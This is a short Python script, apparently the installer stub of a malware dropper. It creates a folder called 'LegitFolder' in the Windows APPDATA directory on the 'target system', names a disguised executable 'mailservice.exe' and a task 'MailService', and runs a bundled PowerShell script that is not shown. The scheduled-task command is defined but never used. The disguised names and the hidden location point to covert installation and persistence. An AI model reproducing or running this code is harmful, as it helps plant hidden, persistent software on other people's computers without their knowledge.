import subprocess
import pathlib
import sys
import os

base = pathlib.Path(getattr(sys, '_MEIPASS', pathlib.Path(__file__).parent))

# ------------- INITIALISE WORKING DIRECTORY IN TARGET SYSTEM -----------------
copy_directory = pathlib.Path(os.path.join(os.getenv("APPDATA"), "LegitFolder"))
executable_path = copy_directory / "mailservice.exe"

process_path = base / "process.ps1"

# Make the specified directory. If it doesn't exist, 
try:
    os.mkdir(copy_directory)
except FileExistsError:
    pass

taskname = "MailService"
command = f'powershell.exe "{executable_path}"'

subprocess.run(["powershell", "-File", process_path])